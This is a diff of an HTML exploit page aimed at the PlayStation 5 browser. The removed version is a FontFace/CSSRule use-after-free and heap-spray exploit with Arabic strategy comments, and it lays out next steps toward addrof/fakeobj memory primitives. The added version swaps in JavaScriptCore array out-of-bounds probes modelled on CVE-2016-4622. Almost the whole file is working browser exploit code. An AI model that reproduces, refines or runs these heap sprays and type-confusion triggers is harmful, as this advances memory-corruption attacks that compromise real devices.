@@ -2,512 +2,129 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v50 - JSC Heap Spray</title>
-<style id="s">
-@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
-@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
-font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
-body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
-background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
-pointer-events:none;z-index:9999}
-#hd{position:fixed;top:0;left:0;right:0;height:44px;
-background:linear-gradient(180deg,#0d0d0d,#080808);
-border-bottom:1px solid #00ff41;display:flex;align-items:center;
-padding:0 16px;gap:14px;z-index:10;font-size:12px}
-.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
-.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
-#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
-#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
-#out{position:fixed;top:46px;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
--webkit-user-select:text}
-#out::-webkit-scrollbar{width:5px}
-#out::-webkit-scrollbar-track{background:#001a06}
-#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
-.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
-.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
-.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
+<title>PS5 - JSC OOB Test (Solution 2)</title>
+<style>
+body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
+pre { white-space: pre-wrap; word-wrap: break-word; }
 </style>
 </head>
 <body>
-<div id="hd">
-<span class="l">▶ v50 JSC SPRAY</span><span class="s">│</span>
-<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h2">STAGE:<b>INIT</b></span>
-</div>
-<div id="pg"><div id="bar" style="width:0%"></div></div>
-<div id="out"></div>
+<pre id="out"></pre>
 <script>
-"use strict";
+var out = document.getElementById("out");
+function log(m) { out.textContent += m + "\n"; }
 
-// ============================================================
-//  PS5 v50 — JSC Heap Spray Diagnostic
-//
-//  الهدف: اختبار سلوك مخصص ذاكرة JSC على PS5
-//
-//  الاستراتيجية:
-//  1. الحصول على aFace من load("1em trigger, x", "AB")
-//  2. التأكد من الثغرة (weight = 700)
-//  3. إنشاء 500 ArrayBuffer بأحجام مختلفة (16, 32, 48, 64, 96, 128)
-//  4. تسجيل byteLength لكل واحد
-//  5. تحرير aFace + GC
-//  6. رش ArrayBuffers إضافية
-//  7. استدعاء wrapper() عبر load("1em A_NN", "B")
-//  8. فحص جميع ArrayBuffers — هل تغير byteLength أي واحد؟
-//  9. إذا تغير: عندنا type confusion على مستوى JSC!
-//
-//  ملاحظة: هذا اختبار تشخيصي. قد لا ينجح، لكن النتائج
-//  تخبرنا إذا كان heap spray ممكناً على PS5 JSC.
-// ============================================================
+log("=== JSC Array OOB Tests (LLInt Compatible) ===\n");
 
-var O=document.getElementById("out");
-var bar=document.getElementById("bar");
-function pg(p){bar.style.width=p+"%"}
-function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
-function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
-
-window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};
-
-var ua=navigator.userAgent||"";
-var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
-
-P("════════════════════════════════════","hd");
-P("  v50 — JSC Heap Spray Diagnostic","hd");
-P("════════════════════════════════════","hd");
-P("");
-
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
-
-var sh=document.getElementById("s").sheet;
-var keep=[],holes=[],trigger=null,uafOk=false;
-
-// ============================================================
-//  PHASE 1: UAF + CSSRule Spray
-// ============================================================
-
-pg(5);Hd("Creating holes...");
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();Ok("Holes ready: "+holes.length);
-
-pg(10);Hd("Trigger setup...");
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();Ok("Trigger ready");
-
-pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");
-
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
-St("UAF WINDOW OPEN");
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-Dm("GC pressure (16MB)...");
-for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-Dm("Spraying 2048 A_ faces...");
-for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
-fs();
-try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-Dm("UAF window closing");
-}return undefined}});
-
-var rn=0;var raf=function(){rn++;
-if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
-if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
-
-// ============================================================
-//  PHASE 2: Identify Confused Object
-// ============================================================
-
-pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
-
+// Test 1: CVE-2016-4622 style (slice + valueOf callback)
+log("Test 1: Array.prototype.slice + valueOf (CVE-2016-4622)");
 try {
-  document.fonts.load("1em trigger, x", "AB").then(function(faces){
-    P("  load() returned "+faces.length+" faces");
-    
-    var aFamily = null, aFace = null;
-    for(var i=0;i<faces.length;i++){
-      var f=faces[i];
-      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
-      if(f.family&&f.family.indexOf("A_")===0){ aFamily = f.family; aFace = f; }
-    }
-    
-    if(!aFamily){ Fl("No A_ face found"); return; }
-    St("RECLAIMED: "+aFamily);
-    keep.push(faces);
-    
-    var aIndex = -1;
-    var aNum = parseInt(aFamily.split("_")[1]);
-    for(var i=0;i<sh.cssRules.length;i++){
-      try {
-        var r = sh.cssRules[i];
-        if(r.type === 5) {
-          if(r.style.getPropertyValue("font-family").indexOf(aFamily) !== -1) { aIndex = i; break; }
-        }
-      } catch(e) {}
-    }
-    if(aIndex === -1){ Fl("CSSRule not found"); return; }
-    
-    var aRule = sh.cssRules[aIndex];
-    var aStyle = aRule.style;
-    Ok("CSSRule at index "+aIndex);
-    P("");
-    
-    // Verify confusion
-    aStyle.setProperty("font-weight", "700"); fs();
-    if(String(aFace.weight) !== "700") { Fl("Confusion dead at start"); return; }
-    Ok("Confusion ALIVE — weight = 700");
-    P("");
-    
-    // ============================================================
-    //  PHASE 3: JSC Heap Spray — Setup
-    // ============================================================
-    
-    pg(40);Sep();Hd("PHASE 3: JSC Heap Spray Setup");Sep();
-    P("  Creating ArrayBuffers of various sizes...","dm");
-    P("  Goal: find which size class matches FontFace JSC cell","dm");
-    P("");
-    
-    // Create ArrayBuffers of various sizes
-    // JSC MarkedBlocks are organized by cell size
-    // Typical sizes: 16, 32, 48, 64, 96, 128, 256, 512
-    var sizes = [16, 32, 48, 64, 80, 96, 112, 128, 192, 256];
-    var buffers = {};
-    var bufferCounts = {};
-    
-    for(var si=0; si<sizes.length; si++) {
-      var sz = sizes[si];
-      buffers[sz] = [];
-      bufferCounts[sz] = 0;
-      
-      // Create 100 buffers of each size
-      for(var i=0; i<100; i++) {
-        try {
-          var ab = new ArrayBuffer(sz);
-          // Fill with marker pattern
-          var dv = new DataView(ab);
-          for(var b=0; b<sz; b+=4) {
-            dv.setUint32(b, 0xDEADBEEF, true);
-          }
-          // Store original byteLength
-          ab._origLen = sz;
-          ab._sizeClass = sz;
-          buffers[sz].push(ab);
-          bufferCounts[sz]++;
-        } catch(e) {}
-      }
-      P("  Created "+bufferCounts[sz]+" ArrayBuffers of size "+sz,"dm");
-    }
-    P("");
-    Ok("Total ArrayBuffers: "+Object.keys(buffers).reduce(function(a,k){return a+buffers[k].length},0));
-    P("");
-    
-    // ============================================================
-    //  PHASE 4: Release aFace + GC + wrapper() trigger
-    // ============================================================
-    
-    pg(50);Sep();Hd("PHASE 4: Release + GC + wrapper()");Sep();
-    P("");
-    Dm("Releasing aFace...");
-    aFace = null;
-    for(var i=0;i<keep.length;i++){
-      if(keep[i] === faces) { keep[i] = null; }
-    }
-    faces = null;
-    
-    Dm("Triggering GC (32MB pressure)...");
-    for(var i=0;i<8;i++){
-      var t=[];
-      for(var j=0;j<256;j++) t.push(new ArrayBuffer(65536));
-    }
-    fs();
-    Ok("GC done — old FontFace cell should be freed");
-    P("");
-    
-    // Spray more ArrayBuffers to fill the freed FontFace cell
-    Dm("Spraying 500 more ArrayBuffers per size class...");
-    for(var si=0; si<sizes.length; si++) {
-      var sz = sizes[si];
-      for(var i=0; i<50; i++) {
-        try {
-          var ab = new ArrayBuffer(sz);
-          var dv = new DataView(ab);
-          for(var b=0; b<sz; b+=4) {
-            dv.setUint32(b, 0xCAFEBABE, true);
-          }
-          ab._origLen = sz;
-          ab._sizeClass = sz;
-          buffers[sz].push(ab);
-        } catch(e) {}
-      }
-    }
-    Ok("Spray complete");
-    P("");
-    
-    // Now trigger wrapper() — creates new FontFace
-    Dm("Triggering wrapper() via load('1em "+aFamily+"', 'B')...");
-    
-    document.fonts.load("1em "+aFamily, "B").then(function(faces2){
-      P("  load() returned "+faces2.length+" faces");
-      for(var i=0;i<faces2.length;i++){
-        P("  Face2["+i+"]: family="+faces2[i].family+" weight="+faces2[i].weight);
-      }
-      
-      var newFace = null;
-      for(var i=0;i<faces2.length;i++){
-        if(faces2[i].family && faces2[i].family.indexOf("A_")===0){
-          newFace = faces2[i];
-        }
-      }
-      
-      if(newFace){
-        keep.push(newFace);
-        St("wrapper() created new FontFace!");
-        Ok("newFace.family = "+newFace.family);
-        Ok("newFace.weight = "+newFace.weight);
-        P("");
-      } else {
-        Fl("No face returned — confusion may have died");
-        P("");
-      }
-      P("");
-      
-      // ============================================================
-      //  PHASE 5: Scan ArrayBuffers for Corruption
-      // ============================================================
-      
-      pg(70);Sep();Hd("PHASE 5: Scan for Corruption");Sep();
-      P("  Scanning all ArrayBuffers for byteLength changes...","dm");
-      P("  If FontFace landed on an ArrayBuffer, byteLength would change","dm");
-      P("");
-      
-      var corrupted = [];
-      var totalScanned = 0;
-      
-      for(var si=0; si<sizes.length; si++) {
-        var sz = sizes[si];
-        var bufs = buffers[sz];
-        var corruptedInClass = 0;
-        
-        for(var i=0; i<bufs.length; i++) {
-          try {
-            var ab = bufs[i];
-            var currentLen = ab.byteLength;
-            totalScanned++;
-            
-            if(currentLen !== sz) {
-              St("CORRUPTION DETECTED!");
-              Hi("  ArrayBuffer size class: "+sz);
-              Hi("  Original byteLength: "+sz);
-              Hi("  Current byteLength:  "+currentLen);
-              Hi("  Index: "+i);
-              corrupted.push({sizeClass:sz, index:i, origLen:sz, newLen:currentLen, buffer:ab});
-              corruptedInClass++;
-              
-              // Try to read the corrupted buffer
-              try {
-                var dv = new DataView(ab);
-                P("  First 32 bytes:","dm");
-                var hex = "";
-                for(var b=0; b<Math.min(32, currentLen); b++) {
-                  var byte = dv.getUint8(b);
-                  hex += (byte<16?"0":"") + byte.toString(16) + " ";
-                  if((b+1)%8===0) { P("    "+hex,"dm"); hex=""; }
-                }
-                if(hex) P("    "+hex,"dm");
-              } catch(e) {
-                Fl("  Read failed: "+e.message);
-              }
+    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+    var triggered = false;
+    arr.__proto__ = {
+        valueOf: function() {
+            if (!triggered) {
+                triggered = true;
+                arr.length = 0; // shrink array during slice
             }
-          } catch(e) {
-            // If accessing byteLength throws, the buffer might be corrupted
-            St("ACCESS ERROR on buffer["+i+"] size "+sz);
-            Hi("  Error: "+e.message);
-            corrupted.push({sizeClass:sz, index:i, error:e.message});
-            corruptedInClass++;
-          }
         }
-        
-        if(corruptedInClass > 0) {
-          Wr("  Size "+sz+": "+corruptedInClass+" corrupted buffers");
-        } else {
-          Dm("  Size "+sz+": all "+bufs.length+" buffers intact");
+    };
+    // In the original bug, slice caches length, calls valueOf, then reads OOB
+    var leaked = arr.slice(0, 8);
+    
+    // Check if we read OOB data (NaN or weird doubles)
+    var hasLeak = false;
+    for (var i = 0; i < leaked.length; i++) {
+        if (typeof leaked[i] === 'number' && isNaN(leaked[i]) && leaked[i] !== undefined) {
+            hasLeak = true;
+            break;
         }
-      }
-      
-      P("");
-      P("  Total scanned: "+totalScanned,"dm");
-      P("  Corrupted: "+corrupted.length, corrupted.length>0?"mg":"dm");
-      P("");
-      
-      // ============================================================
-      //  PHASE 6: Additional Tests
-      // ============================================================
-      
-      pg(85);Sep();Hd("PHASE 6: Additional JSC Tests");Sep();
-      P("");
-      
-      // Test A: Check if newFace properties leak anything
-      if(newFace) {
-        Hd("Test A: newFace property enumeration");
-        try {
-          var keys = Object.getOwnPropertyNames(newFace);
-          P("  Own properties: "+keys.join(", "),"dm");
-        } catch(e) {
-          Fl("  Error: "+e.message);
-        }
-        
-        try {
-          var protoKeys = Object.getOwnPropertyNames(Object.getPrototypeOf(newFace));
-          P("  Proto properties: "+protoKeys.join(", "),"dm");
-        } catch(e) {
-          Fl("  Error: "+e.message);
-        }
-        P("");
-        
-        // Test B: Check if newFace has a different identity than expected
-        Hd("Test B: newFace identity");
-        try {
-          P("  newFace.toString(): "+newFace.toString(),"dm");
-          P("  newFace.status: "+newFace.status,"dm");
-          P("  newFace.load: "+typeof newFace.load,"dm");
-          P("  newFace.display: "+newFace.display,"dm");
-        } catch(e) {
-          Fl("  Error: "+e.message);
-        }
-        P("");
-        
-        // Test C: Try to access properties that might leak
-        Hd("Test C: Property value inspection");
-        var props = ["family","weight","style","stretch","status","display",
-                     "unicodeRange","featureSettings","variationSettings",
-                     "ascentOverride","descentOverride","lineGapOverride"];
-        for(var pi=0; pi<props.length; pi++) {
-          try {
-            var val = newFace[props[pi]];
-            if(val !== undefined && val !== null) {
-              var str = String(val);
-              // Check if value looks like a pointer (large number or hex)
-              if(/^\d+$/.test(str) && parseInt(str) > 0x10000) {
-                Hi("  "+props[pi]+" = "+str+" (0x"+parseInt(str).toString(16)+") ← POSSIBLE LEAK");
-              } else if(/0x[0-9a-f]+/i.test(str)) {
-                Hi("  "+props[pi]+" = "+str+" ← POSSIBLE LEAK");
-              } else {
-                Dm("  "+props[pi]+" = "+str);
-              }
+    }
+    
+    if (hasLeak) {
+        log("  [+] POSSIBLE OOB LEAK DETECTED!");
+        log("  Leaked values: " + JSON.stringify(leaked));
+    } else {
+        log("  [-] No leak. Length: " + leaked.length + " Values: " + JSON.stringify(leaked));
+    }
+} catch(e) {
+    log("  [!] Error: " + e.message);
+}
+
+log("\nTest 2: Array.prototype.concat + Symbol.isConcatSpreadable");
+try {
+    var arr1 = [1.1, 2.2, 3.3];
+    var arr2 = [4.4, 5.5, 6.6];
+    var triggered = false;
+    
+    Object.defineProperty(arr2, Symbol.isConcatSpreadable, {
+        get: function() {
+            if (!triggered) {
+                triggered = true;
+                arr1.length = 0; // Mutate arr1 during concat
             }
-          } catch(e) {
-            Dm("  "+props[pi]+" = ERR:"+e.message);
-          }
+            return true;
         }
-        P("");
-      }
-      
-      // Test D: Check if confusion is still alive after all this
-      Hd("Test D: Confusion liveness check");
-      if(newFace) {
-        aStyle.setProperty("font-weight", "999"); fs();
-        var finalW = newFace.weight;
-        P("  Write font-weight=999, read = "+finalW);
-        if(String(finalW) === "999") {
-          Ok("Confusion ALIVE after all operations!");
-        } else {
-          Fl("Confusion DEAD — weight = "+finalW);
-        }
-      } else {
-        Fl("No newFace to test");
-      }
-      P("");
-      
-      // ============================================================
-      //  PHASE 7: Summary
-      // ============================================================
-      
-      pg(100);Sep();Hd("PHASE 7: Summary");Sep();
-      P("");
-      P("  RESULTS:","hd");
-      P("");
-      P("  ArrayBuffers scanned:  "+totalScanned);
-      P("  Corrupted buffers:     "+corrupted.length);
-      P("  wrapper() triggered:   "+(newFace?"✅ YES":"✘ NO"));
-      P("  Confusion alive:       "+(newFace && String(newFace.weight)==="999"?"✅ YES":"✘ NO"));
-      P("");
-      
-      if(corrupted.length > 0) {
-        St("JSC HEAP SPRAY SUCCESSFUL!");
-        Hi("  FontFace allocation corrupted ArrayBuffer(s)!");
-        Hi("  This means JSC cell reuse is predictable!");
-        Hi("  We can potentially create addrof/fakeobj!");
-        P("");
-        Hi("  NEXT STEP:");
-        Hi("  1. Identify which size class matches FontFace");
-        Hi("  2. Spray controlled data in that size class");
-        Hi("  3. Free FontFace, spray fake object, trigger wrapper()");
-        Hi("  4. Read fake object fields → addrof");
-      } else {
-        Wr("  No corruption detected.");
-        Wr("  JSC allocator did not reuse FontFace cell for ArrayBuffer.");
-        Wr("  Size classes may not overlap, or GC precise.");
-        P("");
-        Wr("  This means JSC heap spray is NOT viable on PS5.");
-        Wr("  The JSC MarkedBlock allocator is too precise.");
-        P("");
-        Hi("  CONCLUSION:");
-        Hi("  We have exhausted JavaScript-only approaches:");
-        Hi("    ✅ CSSFontFace confusion (stable, R/W on 7 fields)");
-        Hi("    ✅ wrapper() trigger (controls m_wrapper updates)");
-        Hi("    ❌ Backward write (CSSOM prevents)");
-        Hi("    ❌ Free + respray (second 'x' kills confusion)");
-        Hi("    ❌ JSC heap spray (allocator too precise)");
-        P("");
-        Hi("  The path forward requires:");
-        Hi("    1. Binary RE (Ghidra) for alternative exploitation");
-        Hi("    2. A different JSC bug for pointer leak");
-        Hi("    3. Or: accept the primitive as-is and find a");
-        Hi("       creative use for CSSFontFace property R/W");
-      }
-      P("");
-      St("★ v50 JSC HEAP SPRAY DIAGNOSTIC COMPLETE ★");
-      hu("h2","STAGE:<b>DONE</b>");
-      
-    }).catch(function(e){
-      Fl("wrapper() load crash: "+e.message);
-      hu("h2","STAGE:<b>CRASH</b>");
     });
     
-  }).catch(function(e){
-    Fl("Phase 2 crash: "+e.message);
-    hu("h2","STAGE:<b>CRASH</b>");
-  });
+    var res = arr1.concat(arr2);
+    if (res.length > 3) {
+        log("  [+] POSSIBLE OOB LEAK DETECTED! Length: " + res.length);
+        log("  Values: " + JSON.stringify(res));
+    } else {
+        log("  [-] No leak. Length: " + res.length);
+    }
 } catch(e) {
-  Fl("Synchronous load() threw: " + e.message);
+    log("  [!] Error: " + e.message);
 }
+
+log("\nTest 3: Array.prototype.splice + valueOf");
+try {
+    var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+    var triggered = false;
+    arr.__proto__ = {
+        valueOf: function() {
+            if (!triggered) {
+                triggered = true;
+                arr.length = 0;
+            }
+        }
+    };
+    var leaked = arr.splice(0, 8);
+    if (leaked.length > 0 && leaked.some(v => typeof v === 'number' && isNaN(v))) {
+        log("  [+] POSSIBLE OOB LEAK DETECTED!");
+        log("  Values: " + JSON.stringify(leaked));
+    } else {
+        log("  [-] No leak. Length: " + leaked.length);
+    }
+} catch(e) {
+    log("  [!] Error: " + e.message);
+}
+
+log("\nTest 4: Array.from + length mutation");
+try {
+    var obj = { length: 8 };
+    var triggered = false;
+    Object.defineProperty(obj, '0', { 
+        get: function() { 
+            if(!triggered){triggered=true; obj.length=0;} 
+            return 1.1; 
+        } 
+    });
+    Object.defineProperty(obj, '1', { get: function() { return 2.2; } });
+    Object.defineProperty(obj, '2', { get: function() { return 3.3; } });
+    
+    var res = Array.from(obj);
+    if (res.length > 1) {
+        log("  [+] POSSIBLE OOB LEAK DETECTED! Length: " + res.length);
+    } else {
+        log("  [-] No leak. Length: " + res.length);
+    }
+} catch(e) {
+    log("  [!] Error: " + e.message);
+}
+
+log("\n=== Tests Complete ===");
 </script>
 </body>
 </html>
